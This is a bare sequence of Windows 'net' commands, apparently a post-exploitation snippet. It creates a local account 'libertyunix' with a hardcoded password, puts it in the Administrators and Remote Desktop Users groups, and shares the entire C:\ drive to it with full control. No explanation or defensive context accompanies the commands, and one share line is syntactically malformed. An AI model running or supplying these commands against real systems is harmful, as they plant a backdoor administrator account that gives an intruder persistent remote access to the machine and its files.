net user /add libertyunix L3tm31nplz
net localgroup administrators libertyunix  /add
net localgroup "Remote Desktop Users" libertyunix  /add
net share concfg*C:\/grant:libertyunix ,full
net share SHARE_NAME=c:\ /grant:libertyunix ,full
